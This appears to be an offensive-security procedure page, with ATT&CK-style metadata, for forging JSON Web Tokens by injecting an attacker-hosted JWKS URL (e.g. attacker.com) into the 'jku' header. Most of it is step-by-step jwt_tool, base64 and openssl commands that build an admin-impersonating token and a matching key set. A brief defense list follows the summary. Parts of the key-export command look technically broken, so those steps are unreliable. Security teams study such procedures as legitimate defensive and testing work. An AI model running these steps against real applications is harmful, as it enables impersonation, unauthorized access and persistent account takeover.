---
id: 8191dfc3-1292-4219-b032-c2a6c8684684
name: JWT-Token-Forgery-via-JWKS-Header-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:00.849385+00:00'
updated_at: '2023-04-10T20:22:36.324305+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Modify Authentication Process|T1556 - Modify Authentication
    Process]]
sub_techniques: []
tags:
  - '[[tags/JWKS-jku-header-injection]]'
  - '[[tags/JWT-Claims]]'
  - '[[tags/JWT-JSON-Web-Token]]'
commands:
  - '[[commands/jwt-tool-decode-token]]'
  - '[[commands/jwt-tool-sign-with-jku-injection]]'
  - '[[commands/jwt-set-payload-claims]]'
  - '[[commands/jwt-set-header-rs256-with-jku]]'
  - '[[commands/jwt-sign-with-private-key]]'
platforms:
  - Web
tools:
  - '[[tools/jwt-tool]]'
validated: true
---

# JWT-Token-Forgery-via-JWKS-Header-Injection

## Summary

This procedure demonstrates how to forge a JSON Web Token (JWT) by signing it with an attacker-controlled private key and injecting a malicious JSON Web Key Set (JWKS) endpoint via the 'jku' header. This allows the token to be verified using the attacker's public key, enabling impersonation of legitimate users for unauthorized access to protected resources.

## Description

JWTs are commonly used for authentication in web applications. The 'jku' header parameter specifies a URL from which the public key for signature verification can be retrieved. By controlling this URL and hosting a JWKS file with the corresponding public key, an attacker can bypass the application's normal authentication process. This technique is effective against applications that do not validate or restrict the 'jku' header, allowing forged tokens with arbitrary claims (e.g., admin privileges). It requires initial knowledge of the application's JWT structure and access to host a malicious JWKS endpoint. Success results in valid tokens that the target application will accept as authentic.

## Requirements

1. Installed [[tools/jwt-tool]] for JWT manipulation.
2. An existing JWT token from the target application to decode and base the forgery on.
3. A private key (RSA) for signing the forged token; generate one if needed using openssl.
4. A publicly accessible server to host the JWKS file containing the public key.
5. Knowledge of the target application's expected JWT claims (e.g., 'login' or 'sub' for user identity).

## Defense

- Implement strict validation of the 'jku' header, restricting it to trusted domains or disabling remote key fetching entirely.
- Use HTTPS for all JWKS endpoints and validate certificate chains to prevent MITM attacks.
- Enforce short token lifetimes and require additional authentication factors beyond JWTs.
- Monitor for anomalous token signatures or unexpected 'jku' values in logs.
- Use static public keys embedded in the application rather than dynamic JWKS endpoints.

## Objectives

1. Forge a JWT that impersonates a legitimate user (e.g., admin) to access sensitive systems.
2. Bypass signature verification by controlling the public key retrieval process.
3. Maintain persistence through reusable forged tokens for ongoing access.

## Instructions

### Step 1: Decode the Original JWT to Understand Structure

**Context**: Begin by decoding an intercepted or known valid JWT from the target application to inspect its header, payload, and signature. This reveals the expected claims and algorithm (e.g., RS256), which you'll replicate in the forgery.

**Command** ([[commands/jwt-tool-decode-token]]):
```bash
python3 jwt_tool.py $_JWT_TOKEN -X s
```

> This command uses jwt_tool to scan and decode the token without verifying the signature (-X s flag skips verification). It outputs the base64-decoded header and payload for analysis.

**Expected Output**: Decoded header (e.g., {"alg":"RS256","typ":"JWT"}) and payload (e.g., {"login":"user","exp":1234567890}), confirming the structure to mimic.

### Step 2: Set Custom Payload Claims

**Context**: Define the desired claims in the JWT payload to impersonate a target user, such as setting 'login' to 'admin'. This step prepares the payload JSON, which will be base64-encoded and combined later.

**Command** ([[commands/jwt-set-payload-claims]]):
```bash
echo '{"login":"$_TARGET_USER"}' | base64 -w 0
```

> Generate the payload JSON and encode it to base64. Replace $_TARGET_USER with the desired username (e.g., 'admin'). This is the payload segment of the JWT.

**Expected Output**: Base64-encoded string like eyJsb2dpbiI6ImFkbWluIn0, ready for token assembly.

### Step 3: Set Header with RS256 Algorithm and Malicious JWKS

**Context**: Create a custom JWT header specifying the RS256 algorithm and injecting the attacker's JWKS endpoint in the 'jku' field. The 'kid' identifies the key in the JWKS file. This tricks the verifier into fetching the public key from your controlled server.

**Command** ([[commands/jwt-set-header-rs256-with-jku]]):
```bash
echo '{"typ":"JWT","alg":"RS256","jku":"$_ATTACKER_JWKS_URL","kid":"$_KEY_ID"}' | base64 -w 0
```

> Encode the header JSON to base64. Set $_ATTACKER_JWKS_URL to your hosted JWKS (e.g., 'https://attacker.com/jwks.json') and $_KEY_ID to a unique identifier (e.g., 'malicious-key').

**Expected Output**: Base64-encoded header like eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MuanNvbiIsImtpZCI6Im1hbGljaW91cy1rZXkifQ.

### Step 4: Generate Private Key and Export Public Key to JWKS

**Context**: If not already available, generate an RSA key pair. Export the public key to a JWKS file hosted at the 'jku' URL. The application will fetch this to verify the forged signature.

**Command** ([[commands/jwt-sign-with-private-key]]):
```bash
openssl genrsa -out private.pem 2048 && openssl rsa -in private.pem -pubout -out public.pem && echo '{"keys":[{"kty":"RSA","kid":"$_KEY_ID","n":"$(openssl rsa -pubin -in public.pem -modulus -noout | cut -d= -f2)","e":"AQAB"}]}' > $_JWKS_FILE
```

> This generates a 2048-bit RSA private key, extracts the public key, and creates a JWKS JSON file. Host $_JWKS_FILE at $_ATTACKER_JWKS_URL. Use the private key for signing.

**Expected Output**: private.pem (for signing), public.pem, and jwks.json with the public key details.

### Step 5: Sign the Forged JWT and Inject JWKS

**Context**: Assemble and sign the JWT using the custom header, payload, and private key. Inject the 'jku' to point to your endpoint. This creates the final forged token.

**Command** ([[commands/jwt-tool-sign-with-jku-injection]]):
```bash
python3 jwt_tool.py $_FORGED_JWT -S rs256 -k private.pem -ju $_ATTACKER_JWKS_URL
```

> Use jwt_tool to sign the pre-assembled token (header.payload) with RS256 and the private key (-S rs256 -k private.pem). The -ju flag injects the malicious JWKS URL. Replace $_FORGED_JWT with 'header_base64.payload_base64' (from steps 2-3).

**Expected Output**: A complete signed JWT like eyJ... (full token), which can be tested against the target application.

### Step 6: Verify the Forged Token

**Context**: Test the forged token against the target to ensure it verifies correctly using your JWKS endpoint. If successful, it grants impersonated access.

**Command** ([[commands/jwt-tool-decode-token]]):
```bash
python3 jwt_tool.py $_FORGED_JWT -v
```

> Decode and verify the token (-v flag attempts verification). The tool should fetch the public key from the 'jku' URL and confirm the signature.

**Expected Output**: Verified signature message, e.g., "Signature verified successfully using key from JKU endpoint."
